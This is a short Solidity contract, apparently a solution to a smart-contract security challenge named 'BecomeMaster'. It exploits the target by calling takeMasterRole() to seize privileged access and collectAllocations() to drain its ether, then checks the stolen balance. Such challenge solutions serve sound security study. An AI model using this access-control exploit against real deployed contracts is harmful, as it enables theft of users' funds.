// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

import "../N5-BecomeMaster-medium.sol";

contract N5ExploitHack {
    N5BecomeMaster instance;
    constructor(N5BecomeMaster _instance) payable {
        instance = _instance;
    }

    function finalize() external {
        instance.takeMasterRole();
        instance.collectAllocations();
        assert(address(this).balance == 0.0001 ether);
    }

    receive() external payable {}
}
